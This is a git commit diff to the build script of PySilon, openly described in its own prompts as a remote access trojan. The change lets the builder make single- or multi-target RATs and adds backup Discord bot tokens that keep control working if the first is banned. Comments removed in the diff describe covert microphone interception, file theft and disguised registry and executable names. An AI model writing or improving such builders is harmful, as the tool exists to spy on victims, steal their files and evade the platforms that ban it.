2eca20d7ed4b6e794a441d8e4d0fcae76b3a1a8f
Mateusz Gołembowski <44233157+mategol@users.noreply.github.com>
2022-12-05 15:05:26 +0100

    You can build PySilon with more than one Discord BOT token from now

--- compiler.py
+++ compiler.py
@@ -1,4 +1,5 @@
 import os
+import sys
 import hashlib
 from tkinter import Tk, filedialog
 
@@ -17,22 +18,47 @@ def get_file_path():
     root.destroy()
     return open_dir
 
+
+mode = int(input('[1] signle\n[2] multi\nDo you want to build single-target RAT or multi-target RAT?'))
+if mode == 1:
+    settings_prompts = [
+        'Main channel ID: ',
+        'Spam channel ID: ',
+        'File channel ID: ',
+        'Recordings channel ID: ',
+        'Voice channel ID: ',
+        'Discord BOT token: ',
+        'Software registry name: ',
+        'Software directory name (default -> REGISTRY_NAME): ',
+        'Software executable name (default -> DIRECTORY_NAME + .exe): '
+    ]
+elif mode == 2:
+    tokens = []
+    tokens_prompts = [
+        'Discord BOT token:',
+        'Discord secondary BOT token (in case of first one getting banned; leave empty if you don\'t want to use secondary token): ',
+        'Discord third BOT token (in case of both first and second ones getting banned; leave empty if you don\'t want to use third token): '
+    ]
+    settings_prompts = [
+        'Software registry name: ',
+        'Software directory name (default -> REGISTRY_NAME): ',
+        'Software executable name (default -> DIRECTORY_NAME + .exe): '
+    ]
+else: print('You can choose from 2 options.'); sys.exit(0)
+
+
 settings = []
 icon_path = ''
-settings_prompts = [
-    'Main channel ID: ',
-    'Spam channel ID: ',
-    'File channel ID: ',
-    'Recordings channel ID: ',
-    'Voice channel ID: ',
-    'Discord BOT token: ',
-    'Software registry name: ',
-    'Software directory name (default -> REGISTRY_NAME): ',
-    'Software executable name (default -> DIRECTORY_NAME + .exe): '
-]
 
-for setting in settings_prompts:
-    settings.append(input(setting))
+if mode == 1:
+    for setting in settings_prompts:
+        settings.append(input(setting))
+else:
+    tokens.append(input(tokens_prompts[0]))
+    tokens.append(input(tokens_prompts[1]))
+    if tokens[1] != '': tokens.append(input(tokens_prompts[2]))
+    for setting in settings_prompts:
+        settings.append(input(setting))
 
 if input('Would you like to set a custom icon to compiled executable? Y/n ').lower() == 'y':
     icon_path = get_file_path()
@@ -43,18 +69,32 @@ with open('PySilon.key', 'wb') as save_key: save_key.write(os.urandom(1024*1024)
 with open('main.py', 'r') as copy_source_code: source_code = copy_source_code.readlines()
 with open('main_prepared.py', 'w') as edit_source_code:
     for line in range(len(source_code)):
-        match line:
-            case 46: edit_source_code.write('bot_token = \'' + settings[5] + '\'   # Paste here BOT-token\n')
-            case 47: edit_source_code.write('software_registry_name = \'' + settings[6] + '\'   # --- Software name shown in registry\n')
-            case 48: edit_source_code.write('software_directory_name = \'' + settings[7] + '\'   # --- Directory (containing software executable) located in "C:\Program Files"\n')
-            case 49: edit_source_code.write('software_executable_name = \'' + settings[8] + '\'   # --- Software executable name\n')
-            case 52: edit_source_code.write('    \'main\': ' + settings[0] + ',   # Paste here main channel ID for general output\n')
-            case 53: edit_source_code.write('    \'spam\': ' + settings[1] + ',   # Paste here spam channel ID for filter key spamming (mostly while target play game)\n')
-            case 54: edit_source_code.write('    \'file\': ' + settings[2] + ',   # Paste here file-related channel ID for browsing, downloading and uploading files\n')
-            case 55: edit_source_code.write('    \'recordings\': ' + settings[3] + ',   # Paste here recording channel ID for microphone recordings storing\n')
-            case 56: edit_source_code.write('    \'voice\': ' + settings[4] + '   # Paste here voice channel ID for realtime microphone intercepting\n')
-            case 59: edit_source_code.write('secret_key = \'' + get_file_hash('PySilon.key') + '\'   # Don\'t touch this line (just leave)\n')
-            case _: edit_source_code.write(source_code[line])
+        if mode == 1:
+            match line:
+                case 46: edit_source_code.write('bot_tokens = [\'' + settings[5] + '\']\n')
+                case 47: edit_source_code.write('software_registry_name = \'' + settings[6] + '\'\n')
+                case 48: edit_source_code.write('software_directory_name = \'' + (settings[7] if settings[7] != '' else settings[6]) + '\'\n')
+                case 49: edit_source_code.write('software_executable_name = \'' + (settings[8] if settings[8] != '' else (settings[7] if settings[7] != '' else settings[6]) + '.exe') + '\'\n')
+                case 52: edit_source_code.write('    \'main\': ' + settings[0] + ',\n')
+                case 53: edit_source_code.write('    \'spam\': ' + settings[1] + ',\n')
+                case 54: edit_source_code.write('    \'file\': ' + settings[2] + ',\n')
+                case 55: edit_source_code.write('    \'recordings\': ' + settings[3] + ',\n')
+                case 56: edit_source_code.write('    \'voice\': ' + settings[4] + '\n')
+                case 59: edit_source_code.write('secret_key = \'' + get_file_hash('PySilon.key') + '\'   # Don\'t touch this line (just leave)\n')
+                case _: edit_source_code.write(source_code[line])
+        else:
+            match line:
+                case 46: edit_source_code.write('bot_tokens = [\'' + ('\', \''.join(tokens) if tokens[-1] != '' else '\', \''.join(tokens[:-1])) + '\']\n')
+                case 47: edit_source_code.write('software_registry_name = \'' + settings[0] + '\'\n')
+                case 48: edit_source_code.write('software_directory_name = \'' + (settings[1] if settings[1] != '' else settings[0]) + '\'\n')
+                case 49: edit_source_code.write('software_executable_name = \'' + (settings[2] if settings[2] != '' else ((settings[1] if settings[1] != '' else settings[0]) + '.exe')) + '\'\n')
+                case 52: edit_source_code.write('    \'main\': None,\n')
+                case 53: edit_source_code.write('    \'spam\': None,\n')
+                case 54: edit_source_code.write('    \'file\': None,\n')
+                case 55: edit_source_code.write('    \'recordings\': None,\n')
+                case 56: edit_source_code.write('    \'voice\': None\n')
+                case 59: edit_source_code.write('secret_key = \'' + get_file_hash('PySilon.key') + '\'   # Don\'t touch this line (just leave)\n')
+                case _: edit_source_code.write(source_code[line])
 
 os.system(pyinstaller_command)
 input('Press ENTER after processing ends...')
